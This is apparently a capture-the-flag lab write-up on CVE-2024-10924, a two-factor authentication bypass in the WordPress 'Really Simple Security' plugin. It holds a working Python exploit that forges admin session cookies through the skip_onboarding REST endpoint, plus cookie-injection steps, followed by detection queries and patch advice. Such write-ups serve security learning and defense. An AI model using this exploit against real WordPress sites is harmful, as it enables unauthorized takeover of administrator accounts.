# Bypass Really Simple Security

## Summary

In this room, we explored the CVE-2024-10924 vulnerability found in the "Really Simple Security" plugin for WordPress. This vulnerability allows an attacker to bypass two-factor authentication (2FA) and gain unauthorized access to user accounts, including those with administrative privileges.

## Techniques Used

- REST API manipulation.
- WordPress authentication bypass.
- Using cookies to access administrator accounts.

## Tools Used

- `Python` for automated exploitation.
- `requests` to make HTTP requests.
- `Burp Suite` for analyzing and modifying requests.
- `Firefox Developer Tools` for cookie injection.

## Commands Executed

```bash
# Example of exploitation using the Python script
python exploit.py 1
```

## Vulnerability Analysis

### How the Vulnerability Works

The issue lies in the improper validation of the `login_nonce` parameter, allowing an attacker to send a **POST** request to the following endpoint:

```
/reallysimplessl/v1/two_fa/skip_onboarding
```

The request parameters used are:

- **user\_id** = ID of the target user.
- **redirect\_to** = URL to redirect to after login.
- **login\_nonce** = Random value that is not properly validated.

This allows generating valid authentication cookies without needing credentials, resulting in a complete account takeover.

### Exploitation

To exploit this vulnerability, a **Python script** was used that:

1. Sends a **POST** request to the vulnerable endpoint with the mentioned parameters.
2. Extracts **session cookies** returned by the server.
3. Allows injecting these cookies into a browser to access `/wp-admin` as an administrator.

```python
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <user_id>")
    sys.exit(1)

user_id = sys.argv[1]

url = "http://vulnerablewp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),
    "login_nonce": "invalid_nonce",
    "redirect_to": "/wp-admin/"
}

response = requests.post(url, json=data)

if response.status_code == 200:
    print("Request successful!\n")
    cookies = response.cookies.get_dict()
    for name, value in cookies.items():
        print(f"{name}: {value}")
else:
    print("Request failed! Status Code:", response.status_code)
```

### Cookie Injection

1. Copy the generated cookies.
2. Open the browser developer tools (`F12` > `Storage` > `Cookies`).
3. Manually add the cookies with the extracted values.
4. Navigate to `http://vulnerablewp.thm:8080/wp-admin` and access the admin panel.

## Detection and Mitigation

### 🔍 Detection Methods

To detect exploitation attempts of **CVE-2024-10924**, activity logs can be analyzed:

- **Check web logs** for suspicious requests to the endpoint:
  ```
  rest_route=/reallysimplessl/v1/two_fa/skip_onboarding
  ```
  with repeated or invalid parameters (`user_id`, `login_nonce`).
- **Analyze authentication logs**, looking for login attempts that bypass 2FA validation.
- **SIEM queries**, such as:
  ```sql
  method:POST AND path:"/reallysimplessl/v1/two_fa/skip_onboarding"
  ```
  to monitor possible attacks.

### 🛠 Mitigation Steps

To fix the vulnerability, the following improvements were implemented:

- **Strict validation of authentication parameters.**
- **Proper error handling** in `skip_onboarding` to prevent invalid authentication attempts.
- **Updating the plugin** to version **9.1.2 or later**, which patches this vulnerability.

## Screenshots or Evidence


## Conclusion and Learnings

- **CVE-2024-10924** highlights the importance of properly validating API requests.
- Exploiting **authentication flaws in WordPress** can lead to full system compromise.
- **Keeping plugins updated** and enabling **auto-updates** is essential.
- **Proactive monitoring** with SIEM tools is key to detecting attacks early.

